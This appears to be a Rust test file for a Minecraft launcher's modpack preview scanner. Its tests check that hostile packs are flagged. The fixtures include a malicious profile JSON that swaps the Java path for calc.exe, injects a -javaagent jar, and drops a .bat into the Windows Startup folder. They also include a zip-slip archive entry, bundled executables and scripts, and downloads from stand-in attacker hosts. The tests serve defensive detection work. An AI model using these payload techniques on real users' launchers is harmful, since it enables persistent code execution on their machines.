use super::*;
use std::io::Write;

const EVIL_PROFILE_JSON: &str = r#"{
  "name": "Totally Legit Optimisation Pack",
  "path": "legit-pack",
  "game_version": "1.21.5",
  "loader": "fabric",
  "is_standard_version": true,
  "use_shared_minecraft_folder": true,
  "banner": { "source": { "type": "absolutePath", "path": "C:/Windows/System32/drivers/etc/hosts" } },
  "settings": {
    "java_path": "C:\\Windows\\System32\\calc.exe",
    "use_custom_java_path": true,
    "overwrite_loader_version": null,
    "custom_jvm_args": "-javaagent:C:/ProgramData/nrc.jar",
    "memory": { "min": 1024, "max": 4096 }
  },
  "mods": [
    {
      "source": {
        "type": "modrinth",
        "project_id": "AANobbMI",
        "version_id": "tFw0iWAk",
        "file_name": "C:/Users/x/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/nrc-poc.bat",
        "download_url": "http://127.0.0.1:8000/calc.bat",
        "file_hash_sha1": null
      },
      "enabled": true,
      "display_name": "Sodium",
      "version": "0.5.3",
      "game_versions": ["1.21.5"],
      "file_name_override": null,
      "associated_loader": "fabric",
      "modpack_origin": null
    }
  ]
}"#;

fn write_pack(dir: &std::path::Path, file_name: &str, profile_json: &str) -> PathBuf {
    let pack_path = dir.join(file_name);
    let file = std::fs::File::create(&pack_path).expect("create pack");
    let mut writer = zip::ZipWriter::new(file);
    let options: zip::write::FileOptions<'_, ()> =
        zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    writer.start_file("profile.json", options).expect("entry");
    writer
        .write_all(profile_json.as_bytes())
        .expect("write profile.json");

    writer
        .start_file("overrides/config/readme.txt", options)
        .expect("entry");
    writer.write_all(b"harmless").expect("write override");

    writer
        .start_file("overrides/../../escape.txt", options)
        .expect("entry");
    writer.write_all(b"escape attempt").expect("write escape");

    writer.finish().expect("finish zip");
    pack_path
}

#[tokio::test]
async fn preview_of_the_disclosed_payload_reports_every_primitive() {
    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = write_pack(dir.path(), "evil.noriskpack", EVIL_PROFILE_JSON);

    let preview = preview_pack(&pack_path).await.expect("preview should work");

    assert_eq!(preview.pack_type, PackFormat::Noriskpack);
    assert_eq!(preview.profile_name.as_deref(), Some("evil"));

    let security = &preview.security;
    assert!(
        security.stripped_java_path.is_some(),
        "custom java path must be reported"
    );
    assert!(
        security.stripped_jvm_args.is_some(),
        "custom jvm args must be reported"
    );
    assert_eq!(
        security.rejected_mods.len(),
        1,
        "the startup-folder mod must be rejected"
    );
    assert!(security.has_critical_findings());

    assert!(security
        .stripped_profile_flags
        .contains(&"is_standard_version".to_string()));
    assert!(security
        .stripped_profile_flags
        .contains(&"use_shared_minecraft_folder".to_string()));
    assert!(security
        .stripped_profile_flags
        .contains(&"banner".to_string()));

    assert_eq!(preview.mod_count, 0, "rejected mods must not be counted");
}

#[tokio::test]
async fn preview_never_writes_outside_the_temp_dir() {
    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = write_pack(dir.path(), "evil.noriskpack", EVIL_PROFILE_JSON);

    let before = std::fs::read_dir(dir.path())
        .expect("read dir")
        .count();

    preview_pack(&pack_path).await.expect("preview should work");

    let after = std::fs::read_dir(dir.path()).expect("read dir").count();
    assert_eq!(before, after, "preview must not create files");
    assert!(
        !dir.path().parent().unwrap().join("escape.txt").exists(),
        "preview must not extract anything"
    );
}

#[tokio::test]
async fn preview_of_a_clean_pack_reports_nothing() {
    let clean = r#"{
      "name": "Performance Pack",
      "path": "performance-pack",
      "game_version": "1.21.5",
      "loader": "fabric",
      "settings": {
        "java_path": null,
        "overwrite_loader_version": null,
        "memory": { "min": 1024, "max": 6144 }
      },
      "mods": []
    }"#;

    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = write_pack(dir.path(), "clean.noriskpack", clean);

    let preview = preview_pack(&pack_path).await.expect("preview should work");

    assert!(
        preview.security.is_clean(),
        "unexpected findings: {:?}",
        preview.security
    );
    assert!(preview.provenance.unknown.is_empty());
    assert!(!preview.provenance.incomplete);
}

#[tokio::test]
async fn flags_scripts_and_executables_shipped_in_overrides() {
    let clean_profile = r#"{
      "name": "Scripted Pack",
      "path": "scripted",
      "game_version": "1.21.5",
      "loader": "fabric",
      "settings": { "java_path": null, "overwrite_loader_version": null,
                    "memory": { "min": 1024, "max": 4096 } },
      "mods": []
    }"#;

    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = dir.path().join("scripted.noriskpack");
    let file = std::fs::File::create(&pack_path).expect("create");
    let mut writer = zip::ZipWriter::new(file);
    let options: zip::write::FileOptions<'_, ()> =
        zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    for (name, body) in [
        ("profile.json", clean_profile.as_bytes()),
        ("overrides/kubejs/startup_scripts/evil.js", b"//" as &[u8]),
        ("overrides/scripts/recipes.zs", b"//"),
        ("overrides/config/helper.exe", b"MZ"),
        ("overrides/config/setup.bat", b"@echo off"),
        ("overrides/mods/legit.jar", b"PK"),
        ("overrides/config/hidden.jar", b"PK"),
        ("overrides/config/options.txt", b"fov:70"),
    ] {
        writer.start_file(name, options).expect("entry");
        writer.write_all(body).expect("write");
    }
    writer.finish().expect("finish");

    let preview = preview_pack(&pack_path).await.expect("preview should work");
    let found = &preview.executable_content;

    assert_eq!(
        found.scripts,
        vec![
            "overrides/kubejs/startup_scripts/evil.js".to_string(),
            "overrides/scripts/recipes.zs".to_string(),
        ]
    );
    assert_eq!(
        found.natives,
        vec![
            "overrides/config/helper.exe".to_string(),
            "overrides/config/hidden.jar".to_string(),
            "overrides/config/setup.bat".to_string(),
        ],
        "a jar outside mods/ is not a mod"
    );
    assert_eq!(found.script_count, 2);
    assert_eq!(found.native_count, 3);
    assert!(!found.truncated);
}

#[tokio::test]
async fn scans_a_curseforge_pack_with_a_renamed_overrides_folder() {
    let manifest = r#"{
      "minecraft": { "version": "1.21.5", "modLoaders": [{ "id": "fabric-0.16.9", "primary": true }] },
      "manifestType": "minecraftModpack",
      "manifestVersion": 1,
      "name": "Renamed Overrides",
      "files": [],
      "overrides": "custom-overrides"
    }"#;

    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = dir.path().join("cf.zip");
    let file = std::fs::File::create(&pack_path).expect("create");
    let mut writer = zip::ZipWriter::new(file);
    let options: zip::write::FileOptions<'_, ()> =
        zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);

    for (name, body) in [
        ("manifest.json", manifest.as_bytes()),
        ("custom-overrides/config/dropper.exe", b"MZ" as &[u8]),
        ("custom-overrides/kubejs/startup_scripts/x.js", b"//"),
        ("custom-overrides/mods/legit.jar", b"PK"),
    ] {
        writer.start_file(name, options).expect("entry");
        writer.write_all(body).expect("write");
    }
    writer.finish().expect("finish");

    let preview = preview_pack(&pack_path).await.expect("preview should work");

    assert_eq!(
        preview.executable_content.natives,
        vec!["custom-overrides/config/dropper.exe".to_string()],
        "a renamed overrides folder must not escape the scan"
    );
    assert_eq!(preview.executable_content.script_count, 1);
}

#[tokio::test]
async fn names_the_foreign_hosts_an_mrpack_downloads_from() {
    let manifest = r#"{
      "formatVersion": 1,
      "game": "minecraft",
      "versionId": "1.0.0",
      "name": "Host Test Pack",
      "dependencies": { "minecraft": "1.21.5", "fabric-loader": "0.16.9" },
      "files": [
        {
          "path": "mods/sodium.jar",
          "hashes": { "sha1": "0000000000000000000000000000000000000000" },
          "downloads": ["https://cdn.modrinth.com/data/a/versions/b/sodium.jar"],
          "fileSize": 10
        },
        {
          "path": "config/allowed.json",
          "hashes": { "sha1": "1111111111111111111111111111111111111111" },
          "downloads": ["https://gitlab.com/o/r/-/raw/main/allowed.json"],
          "fileSize": 10
        },
        {
          "path": "config/sneaky.json",
          "hashes": { "sha1": "2222222222222222222222222222222222222222" },
          "downloads": ["https://cdn.evil-host.example/payload.json"],
          "fileSize": 10
        },
        {
          "path": "resourcepacks/looks-fine.zip",
          "hashes": { "sha1": "3333333333333333333333333333333333333333" },
          "downloads": ["https://files.another-host.test/pack.zip"],
          "fileSize": 10
        }
      ]
    }"#;

    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = dir.path().join("hosts.mrpack");
    let file = std::fs::File::create(&pack_path).expect("create");
    let mut writer = zip::ZipWriter::new(file);
    let options: zip::write::FileOptions<'_, ()> =
        zip::write::FileOptions::default().compression_method(zip::CompressionMethod::Deflated);
    writer
        .start_file("modrinth.index.json", options)
        .expect("entry");
    writer.write_all(manifest.as_bytes()).expect("write");
    writer.finish().expect("finish");

    let preview = preview_pack(&pack_path).await.expect("preview should work");

    assert_eq!(
        preview.security.third_party_download_hosts,
        vec![
            "cdn.evil-host.example".to_string(),
            "files.another-host.test".to_string(),
        ],
        "only non-mod files on hosts outside the allowlist may be reported"
    );
}

#[tokio::test]
async fn rejects_an_archive_without_a_manifest() {
    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = dir.path().join("empty.noriskpack");
    let file = std::fs::File::create(&pack_path).expect("create");
    let writer = zip::ZipWriter::new(file);
    writer.finish().expect("finish");

    assert!(preview_pack(&pack_path).await.is_err());
}

#[tokio::test]
async fn streaming_hash_matches_the_buffered_one() {
    let payload = b"hello".repeat(50_000);

    let (outcome, read_bytes) = stream_sha1(futures_lite::io::Cursor::new(payload.clone()), u64::MAX)
        .await
        .expect("hash should work");

    assert_eq!(read_bytes, payload.len() as u64);
    match outcome {
        HashOutcome::Complete(hash) => assert_eq!(
            hash,
            crate::utils::hash_utils::calculate_sha1_from_bytes(&payload)
        ),
        HashOutcome::BudgetExceeded => panic!("budget should not be hit"),
    }
}

#[tokio::test]
async fn streaming_hash_charges_the_budget_it_burned() {
    let payload = vec![0u8; 1024 * 1024];
    let (outcome, read_bytes) = stream_sha1(futures_lite::io::Cursor::new(payload), 100)
        .await
        .expect("should report, not error");

    assert!(matches!(outcome, HashOutcome::BudgetExceeded));
    assert!(
        read_bytes > 100,
        "bytes actually decompressed must be charged to the budget"
    );
}

#[tokio::test]
async fn rejects_unknown_extensions() {
    let dir = tempfile::tempdir().expect("tempdir");
    let pack_path = write_pack(dir.path(), "evil.exe", EVIL_PROFILE_JSON);

    assert!(preview_pack(&pack_path).await.is_err());
}
